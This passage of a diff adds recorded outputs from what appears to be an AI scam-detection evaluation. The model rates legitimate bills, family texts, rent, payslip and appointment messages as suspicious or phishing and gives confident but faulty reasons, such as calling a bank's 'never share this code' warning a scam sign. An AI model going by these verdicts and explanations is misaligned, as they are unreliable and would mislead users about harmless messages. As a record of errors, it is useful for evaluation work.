+      "out": "{\"risk\": 90, \"verdict\": \"scam\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Revolut verification code is 482913.\", \"why\": \"The message asks for and provides a banking verification code, which should never be shared with anyone.\"}, {\"quote\": \"Never share this code with anyone, including Revolut staff.\", \"why\": \"This is a strong warning against disclosing personal financial information.\"}, {\"quote\": \"Your Revolut verification code is 482913.\", \"why\": \"The message explicitly identifies it as a Revolut verification code, implying a phishing attempt targeting Revolut users.\"}, {\"quote\": \"Never share this code with anyone, including Revolut staff.\", \"why\": \"The instruction to not share the code is highly suspicious and characteristic of a phishing scam.\"}], \"advice\": \"Protect your Revolut account and other financial accounts. Never share your verification code or any sensitive information with unsolicited messages or websites.\"}"
+    },
+    {
+      "id": "legit-utility-bill",
+      "label": "legit",
+      "recordedRisk": 50,
+      "latencyMs": 36062,
+      "out": "{\"risk\": 50, \"verdict\": \"suspicious\", \"category\": \"fake-invoice\", \"reasons\": [{\"quote\": \"Your November electricity bill is ready\", \"why\": \"The message claims to be an invoice but lacks critical details like company name, billing address, or a secure link.\"}, {\"quote\": \"EUR 74.30, due on 15 December\", \"why\": \"While seemingly legitimate, the details are vague and don't establish the sender's authenticity.\"}, {\"quote\": \"It will be collected by direct debit as usual, so you don't need to do anything\", \"why\": \"This phrasing is typical of phishing attempts to avoid direct action from the recipient.\"}, {\"quote\": \"You can see the details in your account on our website or app\", \"why\": \"The message directs to a website or app that could be a phishing site mimicking the original account.\"}], \"advice\": \"Be cautious of unsolicited invoices. Do not click on any links or provide any personal information. Contact your electricity provider directly using a known, verified phone number to confirm the invoice and payment information.\"}"
+    },
+    {
+      "id": "legit-amazon-shipped",
+      "label": "legit",
+      "recordedRisk": 40,
+      "latencyMs": 23810,
+      "out": "{\"risk\": 40, \"verdict\": \"suspicious\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Your Amazon order has shipped\", \"why\": \"While Amazon does ship orders, the link leads to a logged-in Amazon account, attempting to steal credentials.\"}, {\"quote\": \"Track your package\", \"why\": \"Amazon's order tracking page is designed to be legitimate, but the reason for providing a tracker link is suspicious.\"}], \"advice\": \"Do not click on any links in unsolicited emails. Avoid entering your account credentials unless you initiated the process yourself on the Amazon website.\"}"
+    },
+    {
+      "id": "legit-family",
+      "label": "legit",
+      "recordedRisk": 35,
+      "latencyMs": 34379,
+      "out": "{\"risk\": 35, \"verdict\": \"suspicious\", \"category\": \"other\", \"reasons\": [{\"quote\": \"Hi love, can you grab milk and bread on your way home?\", \"why\": \"This message appears to be from an unknown sender using affectionate language, which is often a tactic employed in romance scams.\"}, {\"quote\": \"Also grandma called, she wants to know if we're coming for lunch on Sunday. Call her back when you can.\", \"why\": \"The message attempts to create a sense of urgency and familial obligation to extract personal information and potentially further manipulation.\"}, {\"quote\": \"Call her back when you can.\", \"why\": \"The instruction to call a specific person without context is suspicious.\"}, {\"quote\": \"love\", \"why\": \"Excessive affectionate language is often used in attempts to build trust and encourage vulnerable individuals to share personal details.\"}], \"advice\": \"Be wary of unsolicited messages, especially those using affectionate language and requesting personal information. Do not call the sender based on this message; contact your grandmother directly to verify her request.\"}"
+    },
+    {
+      "id": "legit-hiking-whatsapp",
+      "label": "legit",
+      "recordedRisk": 30,
+      "latencyMs": 22263,
+      "out": "{\"risk\": 30, \"verdict\": \"suspicious\", \"category\": \"off-platform-lure\", \"reasons\": [{\"quote\": \"Join us on WhatsApp, I made a group for the trip so we can sort out cars and food.\", \"why\": \"This is an invitation to join a WhatsApp group for a planned activity, which is unusual for a straightforward hiking invitation.\"}], \"advice\": \"Be wary of joining unsolicited WhatsApp groups for planned events. Request more information about the hike and the organizer before agreeing to anything.\"}"
+    },
+    {
+      "id": "legit-hackathon",
+      "label": "legit",
+      "recordedRisk": 35,
+      "latencyMs": 37656,
+      "out": "{\"risk\": 35, \"verdict\": \"suspicious\", \"category\": \"fake-recruiter\", \"reasons\": [{\"quote\": \"Build with AI Hackathon close on 30 November at 14:00 PT\", \"why\": \"Hackathons are often legitimate events, but unsolicited reminders from unknown entities can be suspicious.\"}, {\"quote\": \"Make sure your project page includes a demo video, a link to your public repository and a short description.\", \"why\": \"While this seems like normal advice, it's a standard tactic used in phishing scams to trick users into revealing sensitive information.\"}, {\"quote\": \"Winners will be announced on 15 December on our Devpost page.\", \"why\": \"The Devpost page URL should be confirmed for legitimacy to ensure it is associated with the hackathon.\"}, {\"quote\": \"Good luck!\", \"why\": \"Friendly but generic closing can be part of a scam; the lack of specific details raises concerns.\"}], \"advice\": \"Be cautious of unsolicited messages reminding you about deadlines. Verify the legitimacy of the hackathon organizers and the Devpost page URL before proceeding. Never click on links in such messages unless you are certain they are trustworthy.\"}"
+    },
+    {
+      "id": "legit-rent",
+      "label": "legit",
+      "recordedRisk": 25,
+      "latencyMs": 30602,
+      "out": "{\"risk\": 25, \"verdict\": \"suspicious\", \"category\": \"fake-invoice\", \"reasons\": [{\"quote\": \"December rent is due on the 1st.\", \"why\": \"Receiving an invoice from an unknown payer or with outdated information can indicate a phishing scam attempting to steal financial details.\"}, {\"quote\": \"Same account as always.\", \"why\": \"While seemingly innocuous, the repetition of a phrase like 'same account' can be a subtle red flag.\"}, {\"quote\": \"Also the plumber will come on Tuesday morning to check the boiler, I hope that's OK.\", \"why\": \"This seems like a normal message but in a scam scenario, there might be attempts to gain your trust first.\"}], \"advice\": \"Be cautious of unsolicited reminders for payments, especially if you don't recognize the sender or the account details. Verify the bill independently through a trusted source.\"}"
+    },
+    {
+      "id": "legit-doctor",
+      "label": "legit",
+      "recordedRisk": 60,
+      "latencyMs": 34114,
+      "out": "{\"risk\": 60, \"verdict\": \"suspicious\", \"category\": \"fake-invoice\", \"reasons\": [{\"quote\": \"Reminder: your appointment...\", \"why\": \"The message resembles a fake invoice or notification requesting action related to a previously agreed-upon appointment, which can be a phishing attempt to obtain personal information.\"}, {\"quote\": \"reply C to cancel...\", \"why\": \"The request to reply with 'C' or call the clinic is suspicious and can be part of a scam to gather contact information or divert to a fraudulent website.\"}, {\"quote\": \"Sofia Family Clinic\", \"why\": \"The mention of a medical clinic could be used to create a sense of urgency and legitimacy, but without verification, it's a red flag.\"}], \"advice\": \"Do not respond to the message. Do not provide any personal information. Verify the clinic's appointment scheduling process through their official website or phone number if they exist. Be wary of unsolicited appointment reminders, especially those requesting actions via text or replying with a code.\"}"
+    },
+    {
+      "id": "legit-oss-issue",
+      "label": "legit",
+      "recordedRisk": 40,
+      "latencyMs": 19839,
+      "out": "{\"risk\": 40, \"verdict\": \"suspicious\", \"category\": \"other\", \"reasons\": [{\"quote\": \"npm install && npm test\", \"why\": \"Instructions asking to install packages and run tests can be a way to distribute malware.\"}], \"advice\": \"Be cautious of requests to run commands; independent testing frameworks are more suitable for code review.\"}"
+    },
+    {
+      "id": "legit-payslip",
+      "label": "legit",
+      "recordedRisk": 20,
+      "latencyMs": 34174,
+      "out": "{\"risk\": 20, \"verdict\": \"suspicious\", \"category\": \"phishing\", \"reasons\": [{\"quote\": \"Your payslip for November 2026 is now available...\", \"why\": \"Requests to access sensitive personal information (payslips) through a seemingly legitimate means of payroll can be a phishing attempt to steal credentials.\"}, {\"quote\": \"Log in with your usual company account...\", \"why\": \"Instructions to log in to an HR portal using a company account without verification can be part of a phishing scheme.\"}, {\"quote\": \"If anything looks wrong, contact payroll through the HR helpdesk.\", \"why\": \"While seemingly harmless, the directive to contact payroll via a specific channel could be a diversion after obtaining login details.\"}, {\"quote\": \"HR portal\", \"why\": \"The mention of an HR portal creates a plausible scenario, but can be a lure for phishing.\"}], \"advice\": \"Be cautious of unsolicited requests for personal information, even from companies. Verify the legitimacy of the message and the HR helpdesk through an independent source before logging in.\"}"
+    },
+    {
+      "id": "legit-crypto-sent",
+      "label": "legit",
+      "recordedRisk": 60,
+      "latencyMs": 31378,
+      "out": "{\"risk\": 60, \"verdict\": \"suspicious\", \"category\": \"wallet-drainer\", \"reasons\": [{\"quote\": \"0.05 ETH (EUR 146.20) to 0x52908400098527886E0F7030069857D2E4169EE7\", \"why\": \"The transaction information provided appears to be a fabricated details about a transaction.\"}, {\"quote\": \"You can see the details under Activity in the app.\", \"why\": \"Instructions to check details within an app are typical of wallet drainage scams.\"}], \"advice\": \"Be wary of details about cryptocurrency transactions that you did not initiate. Always independently verify any transaction details before taking further action. Avoid clicking on links or contacting anyone based on this message.\"}"
+    }
+  ]
+}
